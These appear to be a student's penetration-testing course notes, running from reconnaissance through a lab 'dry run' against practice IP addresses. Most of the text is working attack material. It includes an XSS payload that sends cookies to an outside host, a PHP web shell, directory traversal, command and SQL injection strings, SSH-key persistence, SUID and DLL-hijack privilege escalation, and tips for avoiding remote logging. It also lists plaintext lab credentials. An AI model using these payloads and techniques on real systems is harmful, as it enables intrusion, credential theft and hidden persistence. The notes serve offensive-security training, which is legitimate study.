==========
WEB SITES
==========
https://www.w3schools.com/xml/xpath_syntax.asp
https://www.exploit-db.com
Google dork website https://www.exploit-db.com/google-hacking-database
Wiki site https://en.wikipedia.org/wiki/Google_hacking
=====================
Methodology
=====================
host discovery
host enum ( port scanning )
host interr ( banner grabbing )

Web servers
--script http-enum
interact with the website normally
view page source

=====================
Scrapping with Python
=====================
(Install if needed)
apt install python3-pip
pip3 install lxml
pip3 install requests
--------------------------

import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)


==============
HOST DISCOVERY
==============
for i in {2..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done | awk '{ print $4 }' | sed 's/://g'


Can help Identify a box based on the ping response
128 = windows
64 = some type of nix
60 = mac
255 = solaris

-------------------------------

Port enum
proxychains nmap -sT -Pn -iL ips --open
proxychains nmap -sT -Pn -iL ips -p 1-5000 --open
proxychains nmap -sT -Pn 192.168.28.120 --open
proxychains nmap -sT -Pn 192.168.28.111 -p 80 --script http-enum
proxychains nmap -sT -Pn 192.168.28.111 -p 445 --script smb-os-discovery


----------------------------------

=====================
Nmap Scripts location
=====================

Located in /usr/share/nmap/scripts

Ls -la . | grep "smb*"  ( show all possible smb scripts)


++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
DAY 2

=============
methodology
=============
http-enum script
robots.txt
view page / interact normally
view source

=====
xss
=====
<script>alert("hacked")</script>
<script>document.location="http://10.50.27.253:8000/whatever.php?username=" +document.cookie;</script>


==============
directory trav
==============

../../../../../../../../etc/passwd


==================
command injection
==================
; ls -la



====================
Malicious file
====================
<HTML><BODY>

  <FORM METHOD="GET" NAME="myform" ACTION="">

  <INPUT TYPE="text" NAME="cmd">

  <INPUT TYPE="submit" VALUE="Send">

  </FORM>

  <pre>

  <?php

  if($_GET['cmd']) {

    system($_GET['cmd']);

    }

  ?>

  </pre>

  </BODY></HTML>

===========
ssh key-gen
===========
On target
mkdir /var/www/.ssh 	(or whatever home directory)
echo "RSA KEY" > /var/www/.ssh/authorized_keys   ( might have to change the home directory )
cat /var/www/.ssh/authorized_keys

On opstation
ssh-keygen -t rsa -b 4096
cat .ssh/id_rua.pub
ssh www-data@ip  ( or whatever the webuser is)

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++



POST 
Linux Commands basic 
date & time	= Are we on the right box ? knowing date and time for possible persistence 
Whoami	 = double check who we are logged in as
Id		 = permissions group ( do we have root permissions)
Groups 	= see what groups we are apart of (are we in the sudoers )
sudo -l		= do we have any binaries that execute with higher privs  
cat /etc/passwd	 ( user information)
cat /etc/shadow 	( user information) ( need privileged access)
W  = who is logged in, terminal and what they are doing ( tty  are direct connections to the pc.. So pts are ssh or telnet connections (possible info about other pcs)
Last = information about users that logged in ( user habits ) ( might need to avoid times)
Uptime = how long has the machine been up ( would this make for a good pivot)
Hostname = name of machine ( pay attention)

uname -a 	= kernel information architecture ( for exploits )
cat /etc/*rel* 


Networking Information

Ifconfig -a = network information ( verify your on the right target so you donâ€™t go to jail pimp) ( dbo with the size 15 shoe)
cat /etc/hosts = translates hostnames or domain names to ip addresses ( could see a name to another box, might point a target of interest Windows Server )
cat /etc/resolv.conf = configure dns name servers 
netstat -rn
netstat -antup  ( backdoors and rootkits do use magic packets and udp) ( rsyslog 514 port) programs on different ports we could exploit
arp -an 	= sends data will verify arp cache ( only lasts for a few minutes) passive network enumeration .. Maybe we could find out information about other machines on the network without scanning






Process Information

ps -auxf 	= (a) all processes,  format
Ps -aux | grep syslog* ( just cause itâ€™s running doesnâ€™t mean itâ€™s remotely sending logs)
lsof -p 953 	= list of open files ( files opened by the process ) ( root access can see everything the process is accessing)
lsof -i <4|6> = view files utilizing ip version 
ls -al /proc/886
ls -al /proc/8/fd  = file descriptors ( which is important, last thing we want is tools stolen)
Service --status-all  	=show if services are running or not 
systemctl list-units --type=service



Logging

Cat /etc/rsyslog.conf  = check for remote logging udp port 514 ( can get us caught)
/etc/rsyslog.d 		= directory where config files are kept we want to check those also.
/var/log		=  auth logs, etc
Cat /var/log/auth.log | grep -i successful


Crontabs
Why might we want to check Crontabs? What could we take advantage of?
Crontabs are owned by respective users so you will not be able to see other users crontabs
/var/spool/cron/crontabs = ( same as crontab -e just without syntax help , is where the individual user crontabs live)
/etc/cron.d
Ls -la /etc/cron*
Cat /etc/cron*  crontab
sudo crontab -u student -l








Finding files and locations to check

find / -name password* 2>/dev/null   ( pay attention to file extensions )
find / -type f -name *.txt 	= (possible user generated documents )
find / -type f 2>/dev/null | grep filenamehere
find / -type f -name ".*"= find all hidden files
find / -type d -name ".*"    = find all hidden directories



/tmp		check tmp folders ( global writable )
/home	 	check home folders for users
/etc = config files are here ( can give you a hint if any extra programs have been installed on the box)

TCP Dump
tcpdump -X -A not port ## â†- your ssh connection port






HOST ENUMERATION WINDOWS

General Information

Date /t
Time /t
Hostname
Whoami
systeminfo

User Information
Net user
Net localgroup
Net localgroup administrators
Net use ( if any shares are mapped)


Network Information
Ipconfig /all
Ipconfig /displaydns
Route print
Netstat -ant
Netstat -anob ( need to be admin)



Interesting Locations
Explorer - view - hidden items ( turn on show hidden items )
Check users documents,downloads,desktops
Dir c:\windows\prefetch ( admin ) = see what executables have been ran
Dir /a:h
dir /o:d /t:w c:\windows\system32
dir /o:d /t:w c:\windows\system32\winevt\logs
dir /o:d /t:w c:\windows\temp
reg query hklm\software\microsoft\windows\currentversion\run /s   (donâ€™t forget about hkcu) and runonce

Process and Services 
Tasklist /v
Tasklist /svc
tasklist /svc | findstr /i "PID"

Services.msc ( gui )
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a
Sc query <service name>

Schtasks
Task sch ( gui )
schtasks /query /fo LIST /v
schtasks /query 

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Windows Priv Meth


====Show Hidden Files====
Make sure I can see hidden files


====Check Schedule tasks====

Gui: Task Sch
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | Select-String -Pattern "Task to Run"
schtasks /query /fo LIST /v | Select-String -Pattern "Task to Run" | find /i /v "com handler"


====Check processes====
tasklist /v
query session
Wmic process get name,processid,parentprocessid,sessionid
Wmic process where (processid=1688) list full
tasklist /svc | findstr /i "1688"
where /R c:\ putty			(space after c:\)
(*** show our permissions ) net user user
Icacls C:\Program Files\putty.exe
DLL NAME = SSPICLI.DLL      

====Check Services====
Services.msc  ( look for services with no description )
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
sc qc testservice2
Icacls C:\Program Files\7-Zip\7z.exe

(replace binary with malicious binary and reboot)

====Check Registry====
HKLM RUN AND RUN ONCE
HKCU RUN AND RUN ONCE

====Auditing====
auditpol /get /category:*    (MUST BE ADMIN TO USE)
auditpol /get /category:* |findstr /i "success failure"
wevtutil qe security /c:5 /rd:true /f:text
wevtutil qe system /c:5 /rd:false /f:text /q:"*[System[(EventID=104 or EventID=7040)]]"
wevtutil qe system /c:5 /rd:false /f:text /q:"*[System[(EventID=7045)]]"


%systemroot%\system32\wbem\Logs\``

reg query hklm\software\microsoft\powershell\3\powershellengine\
reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
    # 0 = no | 1 = errors | 2 = verbose




#Transferring a DLL to Windows from Linux without SSH,FTP,SFTP,or Python
1. Run base64 [dll.name] > base64_dll
2. Run md5sum base64_dll to create a MD5 hash of the dll. This will be used to validate the decoded .dll on Windows.
3. Open base64_dll in gedit and Ctrl+A and Ctrl+C the document to copy the code
4. Open an xfreerdp session to Windows using +clipboard
5. Copy the text into a text file on Windows. ( base64.txt )
6. Remove the .txt file extension using the move command on the commandline. ( move base64.txt base64 )
7. Run certutil -decode base64 whatevervulndll.dll to decode the file that was copied
8. Run certutil -hashfile to check the hash of the .dll compared to what it was on Linux prior to copying it.




#include <windows.h> 
int execCommand() 
{  
 WinExec("", 1);
 WinExec("", 1);
 WinExec("", 1);  
 return 0; } 
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved) 
{
 execCommand();  
 return 0;
 }

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

DRY RUN
DryRun


*** if you find command injection   ; ls -la
	; ls -la /var/www/html


==========
Target 1
==========
10.50.23.84
nmap -sT -Pn 10.50.23.84 -p 80 --script http-enum
| http-enum: 
|   /login.php: Possible admin folder
|   /login.html: Possible admin folder
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'

robots.txt ( noppeeeee )

../../../../../../../etc/passwd
	user2:x:1001:1001::/home/user2:/bin/sh
../../../../../../../../etc/hosts
	192.168.28.181 WebApp

/scripts/
system_user=user2
user_password=EaglesIsARE78

SQL injection
tom' or 1='1

.php?username=tom%27+or+1%3D%271&passwd=tom%27+or+1%3D%271


Connecting to T1

cat /etc/hosts

64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=5.31 ms
64 bytes from 192.168.28.181: icmp_seq=1 ttl=63 time=0.703 ms



Target 2 .181
possible sql injection ( 3 columns )

http://192.168.28.181/pick.php?product=7 or 1=1 ( verify vuln )
http://192.168.28.181/pick.php?product=7 union select 1,2,3
http://192.168.28.181/pick.php?product=7 union select table_schema,2,3 from information_schema.columns
http://192.168.28.181/pick.php?product=7 union select table_schema,table_name,column_name from information_schema.columns
http://192.168.28.181/pick.php?product=7 union select user_id,name,username from siteusers.users


Aaron : apasswordyPa$$word

Linux priv

sudo -l		(gtfobins)
find / -perm /4000 2>/dev/null
/usr/bin/nice /bin/sh -p


for i in {2..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
64 bytes from 192.168.28.179: icmp_seq=1 ttl=128 time=1.58 ms

xfreerdp /v:127.0.0.1:2222 /u:Lroth /size:1920x1000 +clipboard















